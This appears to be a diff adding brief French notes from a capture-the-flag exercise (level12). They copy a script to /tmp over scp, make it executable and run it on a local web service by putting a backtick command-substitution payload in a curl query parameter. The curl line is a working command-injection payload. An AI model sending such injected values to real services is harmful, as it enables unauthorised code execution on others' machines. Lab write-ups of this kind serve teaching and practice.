@@ -1,0 +1,8 @@
+copier SC dans /tmp
+scp -P 9999 ./level12/Ressources/SC  level12@localhost:/tmp 
+
+chmod +x /tmp/SC
+
+curl 'localhost:4646?x="`/*/SC`"'
+
+attention les simple quotes sont importantes sinon la commande ne marche pas
